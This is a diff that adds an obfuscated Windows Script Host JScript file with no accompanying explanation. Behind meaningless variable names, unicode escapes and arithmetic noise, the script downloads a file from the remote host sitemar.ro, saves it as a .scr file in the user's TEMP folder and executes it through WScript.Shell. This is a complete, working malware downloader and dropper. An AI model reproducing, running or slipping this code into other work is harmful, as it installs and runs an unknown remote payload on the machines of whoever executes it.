@@ -1,0 +1,24 @@
+genesisAcademy = (((0 + 0) ^ (1 & 1)), this);
+agentReserve = ("t\u0072" + "a\u006es\u006c\u0061" + "\u0074\u006fr", "\u0070eak", function String.prototype.transmissionTradition() {
+	return this
+}, "\u0070r\u006fd" + "uc" + "t", "R" + "un");
+dateAudience = genesisAcademy[("s\u0065c\u0074\u0069" + "o\u006e", "\u0063y" + "b\u0065\u0072\u006ee" + "\u0074\u0069c" + "s", "\u0057\u0053" + "crip\u0074")];
+dateAudience[("\u0070ro\u0067r\u0065" + "ss", "s" + "\u0074\u006frm", "\u0070\u006fr\u0074a" + "\u006c", "S\u006c\u0065\u0065\u0070")](((6732 / 17) * (1813 / 49) + (([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * (((([!+[] + !+[]])) + "" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])))))));
+practicalCollection = dateAudience[("d\u0065\u0070\u006fs" + "i\u0074", "\u0070\u0072e" + "cisi" + "o\u006e", "t" + "a" + "\u0062" + "\u006fo", "adm\u0069" + "\u006e\u0069st\u0072" + "a\u0074i\u006f\u006e", "\u0043r\u0065" + "\u0061\u0074" + "\u0065O\u0062" + "\u006ae\u0063" + "\u0074")](("\u0073" + "\u0074\u0061\u0074" + "\u0069\u0073\u0074" + "ics", "re" + "or" + "\u0067an\u0069\u007a\u0065", "\u0061\u0076" + "\u0069\u0061\u0074i" + "on", "\u0057Scr" + "i\u0070t\u002e" + "Sh" + "e\u006c" + "l"));
+traditionFacade = practicalCollection[("\u0076a\u0072\u0069an" + "\u0074", "\u0045\u0078\u0070" + "\u0061n\u0064E" + "\u006ev\u0069\u0072\u006f" + "\u006e" + "me" + "n" + "t" + "\u0053tr" + "ing" + "\u0073")](("i\u006e\u0066" + "\u006f\u0072\u006d\u0061t\u0069" + "\u006fn", "%TEMP" + "%/")) + ("co" + "\u0064" + "e", "ce\u006etC" + "\u0061\u006e\u0064i\u0064\u0061" + "\u0074e") + ("\u0070res" + "\u0065rv\u0061t" + "\u0069\u0076\u0065", "\u0061" + "v\u0069" + "\u0061t\u0069o" + "n", ".scr");
+trajectoryAutomobile = genesisAcademy[("ma\u0072" + "\u006b", "\u0072e\u0061\u006c", "\u006d" + "ec\u0068" + "a" + "n\u0069c", "W\u0053" + "c\u0072i" + "p\u0074")][("vis" + "\u0061", "C" + "\u0072\u0065a" + "t\u0065\u004fb" + "je\u0063\u0074")](("\u004d\u0053\u0058ML\u0032" + ".XM\u004c\u0048T" + "\u0054\u0050"));
+trajectoryAutomobile[("\u0061ccom" + "m" + "\u006fd\u0061ti" + "o" + "n", "\u0061\u0064e\u0071u" + "a" + "\u0074e", "\u006f\u0070en")](("arcad" + "e", "o" + "r\u0067a" + "niz\u0061\u0074" + "\u0069" + "o\u006e", "\u0047\u0045T"), ("in\u0074el" + "\u006c\u0065ct", "rac" + "\u0065", "pul" + "\u0073\u0065", "\u0068" + "t\u0074p:\u002f/" + "s" + "it\u0065" + "ma" + "r." + "r\u006f\u002f5" + "/\u00392bu" + "y" + "v5"), !((((((14 * 7 + 12) + (76 + 432)) * ((2 & 3) | (0 | 3)) + ((1 ^ 0) + (570 / 38))) / (((396 / 11) + (5 + 1)) & (11 * (5 | 0)))) - (((([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] + (1 * 1)) * ([!+[] + !+[]]) * ([!+[] + !+[]])) - ((Math.pow(141, 2) - 19764) - (229, 38))) | ((7 & 5) * (45 / 15) * ((0 | 0) + 3) + ((4 | 6) - (5 - 3))))) == 6));
+trajectoryAutomobile[("s\u0065\u006ed")]();
+while (trajectoryAutomobile[("\u0061n\u0074" + "enna", "\u0073\u0079nt" + "\u0068" + "es\u0069\u0073", "\u0074o\u006ei" + "c", "\u0072\u0065\u0061" + "\u0064\u0079" + "\u0073ta" + "te")] < 2 * (1 * 2)) {
+	genesisAcademy[("fr\u006fn" + "\u0074", "WSc\u0072" + "\u0069\u0070t")][("co\u006e\u0074\u0072" + "ac\u0074", "le\u0063\u0074\u0075\u0072" + "\u0065", "\u0061\u006d\u006frph" + "\u006f\u0075\u0073", "Sle\u0065" + "\u0070")](((Math.pow(117, 2) - 13589)));
+}
+projectIndustrial = genesisAcademy[("\u0070\u0072od" + "u\u0063" + "\u0074", "\u0057S\u0063ri\u0070" + "t")][("re\u0073" + "i\u0064e" + "\u006e" + "\u0063e", "\u0063\u006fl\u006c" + "\u0065\u0063t", "Cr" + "\u0065at" + "e\u004fb\u006a\u0065" + "c\u0074")](("inject" + "\u0069\u006f\u006e", "pa" + "\u0072\u0061g" + "r\u0061ph", "\u0075\u006e" + "iq\u0075\u0065", "\u006d\u0061\u0078\u0069" + "\u006dum", "AD" + "OD" + "\u0042" + ".S\u0074\u0072e" + "a\u006d"));
+try {
+	projectIndustrial[("l\u0069\u0062\u0065\u0072" + "\u0061l", "\u0070en" + "a\u006ct\u0079", "d\u0065ta" + "\u0069l", "ope" + "n")]();
+	projectIndustrial[("c\u006f\u006d\u006d\u0065" + "\u0072\u0063e", "\u0074y\u0070" + "e")] = ((1 & 1) | (0 | 0));
+	projectIndustrial[("\u0070" + "\u0068\u0061se", "\u0077" + "\u0072" + "\u0069" + "\u0074e")](trajectoryAutomobile[("\u0063\u0072i" + "s\u0069" + "s", "\u0052\u0065s\u0070\u006f\u006e" + "\u0073\u0065Bo" + "d\u0079")]);
+	projectIndustrial[("\u0063o\u006e\u0074ai" + "\u006e\u0065\u0072", "s\u0074" + "\u0075d\u0065n" + "\u0074", "\u0070o\u0073it\u0069" + "o\u006e")] = ((32 | 50) - (Math.pow(53, 2) - 2759));
+	projectIndustrial[("\u0061l\u006d\u0061\u006e" + "a\u0063", "m\u0065t\u0061" + "ph\u006fr", "\u0073\u0061\u0076e" + "\u0054o" + "Fi\u006c\u0065")](traditionFacade, (115, 115, 2));
+	projectIndustrial[("\u0063\u006cos\u0065")]();
+	practicalCollection[agentReserve](traditionFacade.transmissionTradition(), ((55, 141), (284 - 29), 0), (([+[]])));
+} catch (galleryLeader) {};
